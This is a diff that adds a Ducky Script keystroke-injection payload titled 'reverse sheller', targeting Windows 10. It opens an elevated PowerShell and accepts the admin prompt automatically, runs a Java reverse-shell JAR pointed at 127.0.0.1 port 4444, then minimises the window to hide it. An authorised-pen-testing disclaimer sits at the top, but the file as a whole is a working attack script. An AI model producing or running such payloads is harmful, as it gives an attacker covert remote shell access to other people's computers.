@@ -1,0 +1,38 @@
+REM Title: reverse sheller
+REM Author rojberr, https://github.com/rojberr
+REM Target: windows 10 (with admin access), might work with windows 7 idk
+REM THIS IS FOR AUTHORISED USE ON MACHINES YOU EITHER OWN OR HAVE BEEN GIVEN ACCESS TO PEN TEST, ROJBERR IS NO LIABLE
+FOR ANY MISUSE OF THIS SCRIPT
+REM --------------set default delay based on targets computer speed, 350 is around mid range (I think)
+
+REM ------------- 1) first delay is 1 second (you may need more) to let windows set up the "keyboard"
+DELAY 1000
+
+REM ------------ 2) open powershell as admin and set an exclusion path in the
+GUI r
+DELAY 1000
+STRING powershell
+DELAY 1000
+ENTER
+DELAY 5000
+STRING start-process powershell -verb runAs
+ENTER
+DELAY 1000
+ALT y
+DELAY 1500
+
+
+REM ------------ 3) open terminal and execute the reversesheller.jar, creating a reverse shell on a server
+STRING Set-Location -Path D:\
+DELAY 1000
+ENTER
+DELAY 1000
+STRING java -jar reverse-sheller.jar 127.0.0.1 4444
+DELAY 1000
+ENTER
+DELAY 1000
+
+REM ------------ hide shell
+ALT SPACE
+n
+
